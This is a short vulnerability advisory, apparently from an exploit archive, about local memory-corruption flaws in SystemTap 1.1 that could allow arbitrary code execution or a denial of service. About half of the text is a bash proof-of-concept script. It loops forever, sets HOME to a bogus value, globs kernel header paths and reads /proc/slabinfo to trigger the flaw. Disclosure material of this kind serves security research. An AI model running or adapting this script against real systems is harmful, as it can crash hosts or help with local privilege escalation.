source: http://www.securityfocus.com/bid/38120/info

SystemTap is prone to multiple local memory-corruption vulnerabilities.

An attacker may exploit these issues to execute arbitrary code with SYSTEM privileges. Failed exploit attempts will result in a denial of service.

SystemTap 1.1 is vulnerable; other versions may also be affected. 

#!/bin/bash
while [ "0" = "0" ] ; do
HOME=1
/bin/echo /usr/src/kernels/2.6.18-128.el5-PAE-i686/include/*/*

cat /proc/slabinfo
done